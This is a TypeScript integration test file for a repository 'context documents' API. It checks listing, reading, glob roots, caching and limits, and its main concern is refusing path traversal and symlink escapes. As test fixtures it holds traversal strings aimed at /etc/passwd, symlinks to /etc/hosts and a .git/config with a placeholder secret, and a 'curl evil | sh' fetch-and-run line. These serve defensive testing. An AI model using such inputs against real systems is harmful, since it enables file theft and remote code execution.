import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { eq } from 'drizzle-orm';
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import type { RepoRef } from '@devdigest/shared';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MAX_VISITED_ENTRIES } from '../src/modules/context/constants.js';
import { MockGitClient, MockForgeClient } from '../src/adapters/mocks.js';

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[context] Docker not available — skipping integration tests.');
}

/**
 * Project-context documents over a real Postgres and a real (temporary) clone
 * directory: what the listing includes, what a read returns, and — the point of
 * the module — that a traversal attempt is refused as a 422 while a legal path
 * that is simply absent is a 404.
 *
 * `MockGitClient` hard-codes `/mock/clones/<owner>/<name>`, which does not
 * exist, so the fixture subclasses it to point at a temp tree laid out the same
 * way (`<root>/<owner>/<name>`). That keeps the "never cloned" case available:
 * any repo we do NOT create a directory for still resolves to a missing path.
 */
class TempCloneGitClient extends MockGitClient {
  constructor(private root: string) {
    super();
  }
  override clonePathFor(repo: RepoRef): string {
    return path.join(this.root, repo.owner, repo.name);
  }
}

d('/repos/:id/context', () => {
  let pg: PgFixture;
  let root: string;
  let repoId: string;
  let ghostRepoId: string;
  let workspaceId: string;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
    const { db } = pg.handle;

    root = await mkdtemp(path.join(tmpdir(), 'devdigest-context-'));

    const [repo] = await db
      .select()
      .from(t.repos)
      .where(eq(t.repos.fullName, 'acme/payments-api'));
    repoId = repo!.id;
    workspaceId = repo!.workspaceId;

    // A second repo in the same workspace that is never cloned.
    const [ghost] = await db
      .insert(t.repos)
      .values({
        workspaceId: repo!.workspaceId,
        owner: 'ghost',
        name: 'never-cloned',
        fullName: 'ghost/never-cloned',
        createdBy: repo!.createdBy,
      })
      .returning();
    ghostRepoId = ghost!.id;

    const clone = path.join(root, 'acme', 'payments-api');
    for (const dir of ['server/specs', 'specs', 'docs', 'insights', 'src', '.github/docs', 'node_modules/x/docs']) {
      await mkdir(path.join(clone, dir), { recursive: true });
    }
    await writeFile(path.join(clone, 'specs', 'public-api.md'), '# Public API\n\nThe contract.\n');
    await writeFile(path.join(clone, 'server', 'specs', 'a.md'), '# A\n');
    await writeFile(path.join(clone, 'docs', 'architecture.md'), '# Architecture\n');
    await writeFile(path.join(clone, 'insights', 'perf.md'), '# Perf\n');
    // Not context: outside the default roots, dot-dir, excluded dir, wrong extension.
    await writeFile(path.join(clone, 'src', 'x.md'), '# x\n');
    await writeFile(path.join(clone, '.github', 'docs', 'b.md'), '# b\n');
    await writeFile(path.join(clone, 'node_modules', 'x', 'docs', 'n.md'), '# n\n');
    await writeFile(path.join(clone, 'specs', 'install.sh'), 'curl evil | sh\n');
    await writeFile(path.join(clone, 'README.md'), '# Not context\n');
    // In-root symlink pointing out of the clone.
    await symlink('/etc/hosts', path.join(clone, 'specs', 'leak.md'));
    // SF1: in-root symlinks that stay INSIDE the clone but land on a non-document / dot-dir target.
    await mkdir(path.join(clone, '.git'), { recursive: true });
    await writeFile(path.join(clone, '.git', 'config'), '[core]\n\ttoken = SECRET\n');
    await symlink('../.git/config', path.join(clone, 'docs', 'x.md'));
    await symlink('../.github/docs/b.md', path.join(clone, 'docs', 'y.md'));
  });

  afterAll(async () => {
    await pg?.stop();
    if (root) await rm(root, { recursive: true, force: true });
  });

  function makeApp(tokenizer?: { count: (text: string) => number }) {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: {
        git: new TempCloneGitClient(root),
        forge: new MockForgeClient(),
        ...(tokenizer ? { tokenizer } : {}),
      },
    });
  }

  /** A separate repo row + clone dir, so the shared repo's assertions are untouched. */
  async function addRepo(name: string): Promise<{ id: string; clone: string }> {
    const [base] = await pg.handle.db.select().from(t.repos).where(eq(t.repos.id, repoId));
    const [row] = await pg.handle.db
      .insert(t.repos)
      .values({
        workspaceId: base!.workspaceId,
        owner: 'acme',
        name,
        fullName: `acme/${name}`,
        createdBy: base!.createdBy,
      })
      .returning();
    const clone = path.join(root, 'acme', name);
    await mkdir(clone, { recursive: true });
    return { id: row!.id, clone };
  }

  it('lists only regular files matching the search roots, sorted, with type and tokens', async () => {
    const app = await makeApp();
    const res = await app.inject({ method: 'GET', url: `/repos/${repoId}/context` });
    expect(res.statusCode).toBe(200);

    const body = res.json() as {
      docs: { path: string; content?: string; type?: string; tokens?: number }[];
      truncated: boolean;
    };
    expect(body.truncated).toBe(false);
    expect(body.docs.map((f) => f.path)).toEqual([
      'docs/architecture.md',
      'insights/perf.md',
      'server/specs/a.md',
      'specs/public-api.md',
    ]);
    expect(body.docs.every((f) => f.content == null)).toBe(true);
    expect(body.docs.every((f) => typeof f.tokens === 'number')).toBe(true);
    expect(body.docs.find((f) => f.path === 'server/specs/a.md')?.type).toBe('specs');
    await app.close();
  });

  it('roots: default, PUT stores, invalid rejected, DELETE restores', async () => {
    const app = await makeApp();
    const url = `/repos/${repoId}/context/roots`;

    const initial = await app.inject({ method: 'GET', url });
    expect(initial.json()).toEqual({ globs: ['**/{specs,docs,insights}/**/*.md'], is_default: true });

    const put = await app.inject({ method: 'PUT', url, payload: { globs: ['src/**/*.md'] } });
    expect(put.statusCode).toBe(200);
    expect(put.json()).toEqual({ globs: ['src/**/*.md'], is_default: false });
    const list = await app.inject({ method: 'GET', url: `/repos/${repoId}/context` });
    expect((list.json().docs as { path: string }[]).map((d) => d.path)).toEqual(['src/x.md']);

    const bad = await app.inject({ method: 'PUT', url, payload: { globs: ['**/*.txt'] } });
    expect(bad.statusCode).toBe(422);
    expect(JSON.stringify(bad.json())).toContain('**/*.txt');

    const empty = await app.inject({ method: 'PUT', url, payload: { globs: [] } });
    expect(empty.statusCode).toBe(422);
    expect((await app.inject({ method: 'GET', url })).json().globs).toEqual(['src/**/*.md']);

    const reset = await app.inject({ method: 'DELETE', url });
    expect(reset.json()).toEqual({ globs: ['**/{specs,docs,insights}/**/*.md'], is_default: true });
    await app.close();
  });

  it('reads one document with its content, type, tokens', async () => {
    const app = await makeApp();
    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=specs/public-api.md`,
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({
      path: 'specs/public-api.md',
      content: '# Public API\n\nThe contract.\n',
      type: 'specs',
      used_by_agents: 0,
    });
    expect(typeof res.json().tokens).toBe('number');
    await app.close();
  });

  it('refuses a traversal or an out-of-roots path with 422, never a 404', async () => {
    const app = await makeApp();
    for (const attempt of [
      '../../../etc/passwd',
      '/etc/passwd',
      'specs/../../../etc/passwd',
      'specs/install.sh',
      'install.sh',
      'README.md',
      'src/x.md',
    ]) {
      const res = await app.inject({
        method: 'GET',
        url: `/repos/${repoId}/context/doc?path=${encodeURIComponent(attempt)}`,
      });
      expect(res.statusCode, attempt).toBe(422);
      expect(res.json().error.code).toBe('validation_error');
    }
    await app.close();
  });

  it('refuses an in-root symlink that escapes the clone', async () => {
    const app = await makeApp();
    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=specs/leak.md`,
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  it('SF1: refuses an in-clone symlink to .git/config or a dot-dir doc, on the HTTP read and the run read', async () => {
    const app = await makeApp();
    for (const p of ['docs/x.md', 'docs/y.md']) {
      const res = await app.inject({ method: 'GET', url: `/repos/${repoId}/context/doc?path=${p}` });
      expect(res.statusCode).toBe(422);
      expect(res.body).not.toContain('SECRET');
    }
    const run = await app.container.context.readDocsForRun(
      { owner: 'acme', name: 'payments-api', contextGlobs: ['**/{specs,docs,insights}/**/*.md'] },
      ['docs/x.md', 'docs/y.md'],
    );
    expect(run.docs).toEqual([]);
    expect(run.skipped).toEqual([
      { path: 'docs/x.md', reason: 'outside_search_roots' },
      { path: 'docs/y.md', reason: 'outside_search_roots' },
    ]);
    await app.close();
  });

  it('404s for an allowed path that does not exist', async () => {
    const app = await makeApp();
    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=specs/nope.md`,
    });
    expect(res.statusCode).toBe(404);
    await app.close();
  });

  it('a repo that was never cloned lists as empty', async () => {
    const app = await makeApp();
    const res = await app.inject({ method: 'GET', url: `/repos/${ghostRepoId}/context` });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({ docs: [], truncated: false });
    await app.close();
  });

  it("another workspace's repo is 404 for every endpoint", async () => {
    const app = await makeApp();
    const { db } = pg.handle;
    const [otherWs] = await db.insert(t.workspaces).values({ name: 'other-context' }).returning();
    const [foreign] = await db
      .insert(t.repos)
      .values({
        workspaceId: otherWs!.id,
        owner: 'acme',
        name: 'payments-api',
        fullName: 'acme/payments-api',
      })
      .returning();
    const base = `/repos/${foreign!.id}/context`;
    for (const [method, url] of [
      ['GET', base],
      ['GET', `${base}/doc?path=specs/public-api.md`],
      ['GET', `${base}/roots`],
      ['DELETE', `${base}/roots`],
    ] as const) {
      expect((await app.inject({ method, url })).statusCode, `${method} ${url}`).toBe(404);
    }
    expect(
      (await app.inject({ method: 'PUT', url: `${base}/roots`, payload: { globs: ['a/*.md'] } }))
        .statusCode,
    ).toBe(404);
    await app.close();
  });

  it('a missing or empty ?path= is a 422 from the schema', async () => {
    const app = await makeApp();
    expect(
      (await app.inject({ method: 'GET', url: `/repos/${repoId}/context/doc` })).statusCode,
    ).toBe(422);
    expect(
      (await app.inject({ method: 'GET', url: `/repos/${repoId}/context/doc?path=` })).statusCode,
    ).toBe(422);
    await app.close();
  });

  it('SEC3: a 513-character ?path= is a 4xx from the schema, a 512-character one reaches the guard', async () => {
    const app = await makeApp();
    const tail = '/a.md';
    const long = (n: number) => 'specs/' + 'a'.repeat(n - 6 - tail.length) + tail;
    const over = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=${long(513)}`,
    });
    expect(over.statusCode).toBeGreaterThanOrEqual(400);
    expect(over.statusCode).toBeLessThan(500);
    expect(over.json().error.code).toBe('validation_error');
    const atCap = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=${long(512)}`,
    });
    // within the bound: the service guard answers (404 not found), not the schema
    expect(atCap.statusCode).toBe(404);
    await app.close();
  });

  it('used_by_agents counts direct, enabled-skill and disabled-agent links, not disabled-skill-only', async () => {
    const app = await makeApp();
    const { db } = pg.handle;
    const doc = 'docs/architecture.md';
    const mk = async (name: string, enabled = true) =>
      (
        await db
          .insert(t.agents)
          .values({ workspaceId, name, provider: 'openai', model: 'm', systemPrompt: 'p', enabled })
          .returning()
      )[0]!;
    const mkSkill = async (name: string, enabled: boolean) =>
      (
        await db
          .insert(t.skills)
          .values({ workspaceId, name, description: 'd', type: 'custom', source: 'manual', body: 'b', enabled })
          .returning()
      )[0]!;

    const direct = await mk('ctx-direct');
    const disabledAgent = await mk('ctx-disabled-agent', false);
    const viaEnabled = await mk('ctx-via-enabled');
    const viaDisabledSkill = await mk('ctx-via-disabled-skill');
    const onSkill = await mkSkill('ctx-skill-on', true);
    const offSkill = await mkSkill('ctx-skill-off', false);

    await db.insert(t.agentContextDocs).values([
      { agentId: direct.id, path: doc, order: 0 },
      { agentId: disabledAgent.id, path: doc, order: 0 },
    ]);
    await db.insert(t.skillContextDocs).values([
      { skillId: onSkill.id, path: doc, order: 0 },
      { skillId: offSkill.id, path: doc, order: 0 },
    ]);
    await db.insert(t.agentSkills).values([
      { agentId: viaEnabled.id, skillId: onSkill.id, order: 0 },
      { agentId: viaDisabledSkill.id, skillId: offSkill.id, order: 0 },
    ]);

    const res = await app.inject({
      method: 'GET',
      url: `/repos/${repoId}/context/doc?path=${doc}`,
    });
    expect(res.json().used_by_agents).toBe(3);
    await app.close();
  });

  it('lists 500 documents in under 2 seconds', async () => {
    const app = await makeApp();
    const big = path.join(root, 'acme', 'payments-api', 'docs', 'bulk');
    await mkdir(big, { recursive: true });
    await Promise.all(
      Array.from({ length: 500 }, (_, i) => writeFile(path.join(big, `d${i}.md`), `# Doc ${i}\n\nbody\n`)),
    );
    const started = Date.now();
    const res = await app.inject({ method: 'GET', url: `/repos/${repoId}/context` });
    const elapsed = Date.now() - started;
    expect(res.statusCode).toBe(200);
    expect(res.json().docs.length).toBe(500);
    expect(res.json().truncated).toBe(true);
    expect(elapsed).toBeLessThan(2000);
    await app.close();
  });

  it('a repeat listing re-reads no unchanged doc; a changed size re-counts once', async () => {
    const { id, clone } = await addRepo('cache');
    await mkdir(path.join(clone, 'docs'), { recursive: true });
    const file = path.join(clone, 'docs', 'a.md');
    await writeFile(file, '# A\n');
    let calls = 0;
    const app = await makeApp({
      count: (text: string) => {
        calls++;
        return text.length;
      },
    });
    const list = () => app.inject({ method: 'GET', url: `/repos/${id}/context` });
    const first = await list();
    expect(first.json().docs[0].tokens).toBe(4);
    expect(calls).toBe(1);

    await list();
    expect(calls).toBe(1);

    await writeFile(file, '# A longer\n');
    const third = await list();
    expect(calls).toBe(2);
    expect(third.json().docs[0].tokens).toBe(11);
    await app.close();
  });

  it('the listing and the single-doc read share one token-cache entry', async () => {
    const { id, clone } = await addRepo('cache-share');
    await mkdir(path.join(clone, 'docs'), { recursive: true });
    await writeFile(path.join(clone, 'docs', 'a.md'), '# A\n');
    let calls = 0;
    const app = await makeApp({
      count: (text: string) => {
        calls++;
        return text.length;
      },
    });
    await app.inject({ method: 'GET', url: `/repos/${id}/context` });
    expect(calls).toBe(1);
    const doc = await app.inject({ method: 'GET', url: `/repos/${id}/context/doc?path=docs/a.md` });
    expect(doc.statusCode).toBe(200);
    expect(calls).toBe(1);
    await app.close();
  });

  it('lists and reads a doc nested 10 folders deep; a self-parent symlink changes nothing', async () => {
    const { id, clone } = await addRepo('deep');
    const nested = path.join(clone, 'docs', ...Array.from({ length: 10 }, (_, i) => `d${i}`));
    await mkdir(nested, { recursive: true });
    await writeFile(path.join(nested, 'deep.md'), '# Deep\n');
    const rel = ['docs', ...Array.from({ length: 10 }, (_, i) => `d${i}`), 'deep.md'].join('/');
    await symlink(path.join(clone, 'docs'), path.join(clone, 'docs', 'd0', 'loop'));
    const app = await makeApp();
    const res = await app.inject({ method: 'GET', url: `/repos/${id}/context` });
    expect(res.statusCode).toBe(200);
    expect(res.json().truncated).toBe(false);
    expect((res.json().docs as { path: string }[]).map((d) => d.path)).toEqual([rel]);
    const doc = await app.inject({ method: 'GET', url: `/repos/${id}/context/doc?path=${rel}` });
    expect(doc.statusCode).toBe(200);
    await app.close();
  });

  it('truncates at the visited-entries cap, and pruned roots never reach it', async () => {
    const { id, clone } = await addRepo('big');
    const many = path.join(clone, 'src', 'many');
    await mkdir(many, { recursive: true });
    await mkdir(path.join(clone, 'docs'), { recursive: true });
    await writeFile(path.join(clone, 'docs', 'a.md'), '# A\n');
    for (let i = 0; i <= MAX_VISITED_ENTRIES; i += 1000) {
      await Promise.all(
        Array.from({ length: Math.min(1000, MAX_VISITED_ENTRIES + 1 - i) }, (_, j) =>
          writeFile(path.join(many, `f${i + j}.txt`), ''),
        ),
      );
    }
    const app = await makeApp();
    const url = `/repos/${id}/context`;
    expect((await app.inject({ method: 'GET', url })).json().truncated).toBe(true);

    const put = await app.inject({
      method: 'PUT',
      url: `${url}/roots`,
      payload: { globs: ['docs/**/*.md'] },
    });
    expect(put.statusCode).toBe(200);
    const pruned = await app.inject({ method: 'GET', url });
    expect(pruned.json().truncated).toBe(false);
    expect((pruned.json().docs as { path: string }[]).map((d) => d.path)).toEqual(['docs/a.md']);
    await app.close();
  });

  // 101 globs and a 1025-char glob are refused by the route schema; stored roots stay as they were
  it('PUT roots: 101 globs and a 1025-char glob are a 4xx and change nothing', async () => {
    const { id } = await addRepo('roots-bounds');
    const app = await makeApp();
    const url = `/repos/${id}/context/roots`;
    const tooMany = await app.inject({
      method: 'PUT',
      url,
      payload: { globs: Array.from({ length: 101 }, (_, i) => `docs/d${i}/*.md`) },
    });
    expect(tooMany.statusCode).toBe(422);
    const tooLong = await app.inject({
      method: 'PUT',
      url,
      payload: { globs: ['a'.repeat(1022) + '.md'] },
    });
    expect(tooLong.statusCode).toBe(422);
    expect((await app.inject({ method: 'GET', url })).json().is_default).toBe(true);

    // 21 passes the schema (max 100) but the service caps at MAX_ROOT_GLOBS (20)
    const over = await app.inject({
      method: 'PUT',
      url,
      payload: { globs: Array.from({ length: 21 }, (_, i) => `docs/d${i}/*.md`) },
    });
    expect(over.statusCode).toBe(422);
    const atCap = await app.inject({
      method: 'PUT',
      url,
      payload: { globs: Array.from({ length: 20 }, (_, i) => `docs/d${i}/*.md`) },
    });
    expect(atCap.statusCode).toBe(200);
    await app.close();
  });

  // the cap is `++visited > 20_000`: exactly 20,000 entries lists fully, the 20,001st truncates
  it('visited cap: exactly MAX_VISITED_ENTRIES is not truncated, one more is', async () => {
    const { id, clone } = await addRepo('cap-edge');
    const dir = path.join(clone, 'docs');
    await mkdir(dir, { recursive: true });
    // 1 dir + (MAX - 1) files = exactly MAX entries visited
    const writeRange = async (from: number, to: number) => {
      for (let i = from; i < to; i += 1000) {
        await Promise.all(
          Array.from({ length: Math.min(1000, to - i) }, (_, j) => writeFile(path.join(dir, `f${i + j}.txt`), '')),
        );
      }
    };
    await writeRange(0, MAX_VISITED_ENTRIES - 1);
    const app = await makeApp();
    const url = `/repos/${id}/context`;
    expect((await app.inject({ method: 'GET', url })).json().truncated).toBe(false);

    await writeFile(path.join(dir, 'one-more.txt'), '');
    expect((await app.inject({ method: 'GET', url })).json().truncated).toBe(true);
    await app.close();
  }, 60_000);
});
